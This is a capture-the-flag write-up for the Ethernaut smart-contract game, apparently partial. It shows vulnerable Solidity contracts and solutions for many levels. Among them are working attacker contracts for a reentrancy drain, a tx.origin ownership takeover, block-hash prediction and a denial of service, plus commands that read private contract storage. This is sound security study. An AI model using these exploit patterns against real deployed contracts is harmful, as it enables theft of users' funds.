CTF: [Ethernaut](https://ethernaut.openzeppelin.com/)

## 01 Hello Ethernaut

```javascript
await contract.info();
await contract.info1();
await contract.info2("hello");
await contract.infoNum();
await contract.info42();
await contract.theMethodName();
await contract.method7123949();
await contract.authenticate(await contract.password());
```

## 02 Fallback

You will beat this level if
- you claim ownership of the contract
- you reduce its balance to 0

<details> 
<summary>Code</summary>

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```
</details>

<details> 
<summary>Solution</summary>

In the `contribute` function, ownership is granted to the address that has contributed more than the current owner. However, in the `receive` function, ownership is granted solely to any address that sends ether to the contract as long as it has a non-zero contribution, regardless of whether it has contributed more than the current owner. This  allows an attacker to become the owner of the contract without actually out-contributing the current owner.

Steps:
1. Call the `contribute` function and send any amount less than `0.001 ether`. Even `1 wei` is sufficient.
2. Trigger the `receive` function by manually sends `ether` directly to the contract. Again, the amount can be as little as 1 wei.
3. Once the `receive` function executes, you'll become the contract owner.
4. As the new owner, you can now call the `withdraw` function to drain all the `ether` from the contract.

</details>

## 03 Fallout

Claim ownership of the contract below to complete this level.

<details> 
<summary>Code</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```
</details>

<details> 
<summary>Solution</summary>

In this contract, the intended `constructor` is written as a function named `Fal1out`, which was the convention for constructors in versions of Solidity **prior to 0.4.22**. However, this contract is using Solidity **0.6.0**, where constructors must be declared using the `constructor` keyword.

Moreover, the function name `Fal1out` is not even the same as the contract name `Fallout`, it uses a digit "1" instead of the letter "l". As a result, the function `Fal1out` is treated as a public, regular function that can be called by anyone, not a constructor.

1. Call the `Fal1out` function and send some ether (even 0 is fine).
2. In Remix, it's recommended to create an interface for the contract and paste the deployed address to interact with it. Or if in browser, run `await contract.Fal1out()`
3. This sets `msg.sender`, you, as the new `owner`.

</details>

## 04 Coin Flip

This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

<details> <summary>Code</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```
</details>

<details> <summary> Solution </summary>

This contract uses the previous block's hash along with a constant value to generate randomness. However, this approach is not truly random. It can be easily predicted or even influenced by miners.

```solidity
contract Hacker {

    CoinFlip CF;
    constructor(address _CoinFlip) {
        CF = CoinFlip(_CoinFlip);
    }

    // Note: 10 consecutive streak wins
    function cheat() external {
        uint256 coinFlip = uint256(blockhash(block.number - 1)) / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool answer = coinFlip == 1 ? true : false;

        // for (uint i = 0; 1 < 10; i++) {
        //     require(CF.flip(answer), "Wrong Answer");
        // }

        require(CF.flip(answer), "Wrong Answer");
    }

}
```

To guess the randomness with 100% accuracy and no risk, simply replicate the logic used by the original contract. As long as you're operating within the same block, the generated randomness will be identical due to the deterministic mechanism used. <br>

Deploy the contract above and call the `cheat` function 10 times. Be sure to wait a few seconds between each call to ensure that transactions are not included in the same block. Otherwise, the `CoinFlip::flip()` function will revert due to the `lastHash` check.

</details>

## 05 Telephone

Claim ownership of the contract below to complete this level.

<details> <summary>Code</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

</details>

<details> <summary> Solution </summary>

The function `Telephone::changeOwner` grants ownership based on a check against `tx.origin`.

```solidity
contract Phish {

    Telephone telephone;
    constructor(address _telephone) {
        telephone = Telephone(_telephone);
    }

    /** 
     * msg.sender = immediate caller
     * tx.origin = EOA who started the tx (e.g., you)
     *
     * Eg:
     * Bob -> A -> B -> C -> D
     * msg.sender == address of the previous caller
     * tx.origin == Bob
     *
     * This Scenario:
     * Bob -> phish.phishing() -> Telephone.changeOwner()
     *
     * msg.sender for phish.phishing() -> Bob
     * msg.sender for Telephone.changeOwner() -> phish
     * tx.origin for phish.phishing() -> Bob
     * tx.origin for Telephone.changeOwner() -> Bob
     * 
     */
    function phishing() public {
        telephone.changeOwner(msg.sender);
    }

}

```

Deploy the contract above and call the `phishing` function. To claim ownership of the `Telephone` contract, you must call it through another contract (like the `Phish` contract). This is necessary because the `Telephone::changeOwner` function only updates the owner if `msg.sender != tx.origin`.

By calling `Phish::phishing` from your EOA:
- `msg.sender` inside `Telephone::changeOwner()` becomes the `Phish` contract address.
- `tx.origin` remains you (the original EOA who initiated the transaction).
- Since `msg.sender != tx.origin`, the condition passes, and the owner is successfully changed to your address.

</details>

## 06 Token

The goal of this level is for you to hack the basic token contract below.

You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

<details> <summary> Code </summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```

</details>

<details> <summary> Solution </summary>

Solidity versions prior to `0.8.0`, arithmetic operations do not automatically revert on overflow or underflow. Instead, the value wraps around:
- Overflow wraps to zero and upward from there.
- Underflow wraps to the maximum value.

To get large amount of token, simply call `transfer` with a value greater than 20, for example `transfer(anyAddressButNotYours, 21)`. The `balances[msg.sender] -= 21` operation will cause underflow, setting your balance to `2^256 - 1`, a massive number.

</details>

## 07 Delegation

The goal of this level is for you to claim ownership of the instance you are given.

<details> <summary> Code </summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

</details>

## 08 Force

Some contracts will simply not take your money `¯\_(ツ)_/¯`

The goal of this level is to make the balance of the contract greater than zero.

<details> <summary> Code </summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```

</details>

## 09 Vault 

Unlock the vault to pass the level!

<details> <summary> Code </summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

</details>

<details> <summary> Solution </summary>

Even though the password is marked as private, all contract storage is publicly readable on-chain.

Solidity stores state variables in sequential storage slots:
- `locked` → slot 0
- `password` → slot 1

We can read slot 1 directly to obtain the password, below is the format to retrive private data:

```bash
cast storage <contract-address> <slot> --rpc-url $RPC_URL
```

Below is the example of using it to "unauthorize" getting access to read private data: 


1. Retrieve the data from the private storage
```bash
cast storage 0x334dd1624206eFe0e351FdF67F0dd0Cf3761433d 1 --rpc-url $RPC_URL
```

2. Then the following output from the command is the actual private data stored on-chain:
```bash
0x412076657279207374726f6e67207365637265742070617373776f7264203a29
```

call `unlock` function by pasting the `password` data from the storage slot 1 (second command as shown above)

</details>

## 10 King

The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

Such a fun game. Your goal is to break it.

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

<details> <summary> Code </summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

</details>

<details> 

If a contract without a `receive` or `fallback` function becomes the king, it will reject ETH transfers (since it can’t receive any), this will cause `transfer` to fail in any future transaction inside the `receive` function, making no one can become the king anymore

```solidity
contract Evil {
    
    constructor(address payable king) payable {
        (bool ok, ) = king.call{ value: King(king).prize() } ("");
        require(ok, "Transfer Failed");
    }

    // Note:
    // the absent of receive/fallback makes this contract not being able
    // to receive funds (except selfdestruct) ... therefore broke the game

}
```

deploy the above contract and send at least an equivalent amount of the existing `prize` value as fund to become the king. the absent of `receive`or `fallback` function in `Evil` contract prevent receive any funds (except `selfdestruct()`), making the `payable(king).transfer(msg.value);` line fails in the future call of attempting becoming the king via `King::recieve` function.

</details>

## 11 Re-entrancy

The goal of this level is for you to steal all the funds from the contract.

<details> <summary> Code </summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

</details>

<details> <summary> Solution </summary>

```solidity
contract Hacker {

    Reentrance public R;
    constructor(address payable _R) public {
        R = Reentrance(_R);
    }

    function Hack() external payable {
        require(msg.value == 1000000000000000, "Must be 1000000000000000");
        R.donate{value: 1000000000000000}(address(this));
        R.withdraw(1000000000000000);
    }
    receive() external payable { 
        if (CheckBalance() >= 1000000000000000) {
            R.withdraw(1000000000000000);
        }
    }

    function CheckBalance() public view returns(uint) {
        return address(R).balance;
    }

}
```

The vulnerability in the `Reentrance` contract lies in the `withdraw` function, where the balance update occurs after the external call. This allows a malicious contract to re-enter the `withdraw` function before the state is updated, effectively withdrawing multiple times using the same balance. By deploying the attacker contract shown above, you can exploit this reentrancy flaw to recursively drain the contract's entire balance.

</details>

## 12 Elevator

This elevator won't let you reach the top of your building. Right?

<details> <summary> Code </summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

</details>

<details> <summary> Solution </summary>

```solidity
contract Construction is Building {
    Elevator elevator;
    uint Count;
    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }
    function goTo(uint _floor) external {
        elevator.goTo(_floor);
    }
    function isLastFloor(uint256 /* _floor */ ) 
        external 
        override 
        returns (bool) 
    {
        Count ++;
        return Count % 2 == 0;
    }
}
```

The `Elevator::goTo` function calls `Building::isLastFloor` twice, first to check if the requested floor is not the top floor, and a second time to set the `top` state variable. Deploy the contract above and call `goTo` function, you can exploit this behavior to make the `Elevator` contract to reach to the top floor.

In the `Construction` contract, `isLastFloor` increments a `count` and returns `true` only when the `count` is even. Since `Elevator::goTo` calls `isLastFloor` twice, the first call will return `false` (odd), allowing the condition to pass, and the second call will return `true` (even), causing the `Elevator` contract to set `top` to `true`.

</details>

## 13 Privacy

The creator of this contract was careful enough to protect the sensitive areas of its storage.

Unlock this contract to beat the level.

<details> <summary> Code </summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }

    /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
    */
}
```

</details>

<details> <summary> Solution </summary>

```solidity
    bool public locked = true;                              // slot 0
    uint256 public ID = block.timestamp;                    // slot 1
    uint8 private flattening = 10;                          //  ┐
    uint8 private denomination = 255;                       //  │ slot 2
    uint16 private awkwardness = uint16(block.timestamp);   //  ┘
    bytes32[3] private data;                                // slot 3, 4, 5
```

Similar to Level 9 Vault, retrieve the data from the private variable. To unlock the contract, we need to retrieve the value at **storage slot 5**, which corresponds to `data[2]`. We do this with:

```bash
cast storage <contract-address> 5 --rpc-url $RPC_URL
```

example as below:

```bash
cast storage 0x5ca9d60b06E68C84845558551ea55Ba9210ceFcc 5 --rpc-url $RPC_URL 
```

The `unlock` function expects a `bytes16` input, so we need to extract the first `16 bytes` of the `bytes32` value from slot 5. To help with this, you can deploy the following helper contract to cast `bytes32` to `bytes16`:

```solidity
contract CastBytes {
    function Cast(bytes32 _data) 
        public 
        pure 
        returns(bytes16)
    {
        return bytes16(_data);
    }
}
```

Call this function with the value you retrieved from storage slot 5, and use the result as input to the `Privacy::unlock` function unlock the contract.

</details>

## 14 Gatekeeper One

Make it past the gatekeeper and register as an entrant to pass this level.

<details> <summary> Code </summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

</details>

## 15 Gatekeeper Two

## 16 Naught Coin

NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

<details> <summary> Code </summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}
```

</details>

<details> <summary> Solution </summary>

Approve someone to spend the tokens on your behalf. Since the `timeLock` modifier only applies to the `transfer` function, you can take advantage of `transferFrom` to let someone spend the tokens for you, moving them to another address without waiting for 10 years.

You might need an interface to interact with the `NaughtCoin` contract, as well as a separate address (or contract) to act as the spender. Below is a sample contract that moves your tokens to another address without having to wait for 10 years:

```solidity
// Note:
// Get access to the `NaughtCoin` contract here
interface INaughtCoin {
    function player() external view returns (address);
    function transferFrom(address _from, address _to, uint256 _value) external;
    function approve(address _spender, uint256 value) external returns (bool);
    function balanceOf(address _account) external view returns (uint256);
}

// Note:
// This is gonna be the spender speading your token
contract Spender {
    function Spend(address _naughtCoint) public {
        INaughtCoin _INaughtCoin = INaughtCoin(_naughtCoint);
        address player = _INaughtCoin.player();
        uint playerBal = _INaughtCoin.balanceOf(player);
        _INaughtCoin.transferFrom(player, address(this), playerBal);
    }
}
```

1. Deploy `Spender` contract (or any EOA will do, but in this case we use contract)
2. Get the `NaughtCoin` address and deploy the `INaughtCoin`, then approve the spender to spend all of your tokens
3. if you're using `Spender` contract, call `Spender::Spend` to have `Spender` contract spend the tokens on your behalf
4. if you wish to use another EOA address as a spender, switch your address to another EOA account and call `transferFrom` function. Ensures that spender is transfering all of your tokens to pass this level.

</details>

## 17 Preservation

This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.

The goal of this level is for you to claim ownership of the instance you are given.

<details> <summary> Code </summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```

</details>

## 18 Recovery 

A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.001 ether to obtain more tokens. They have since lost the contract address.

This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.

<details> <summary> Code </summary>

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
```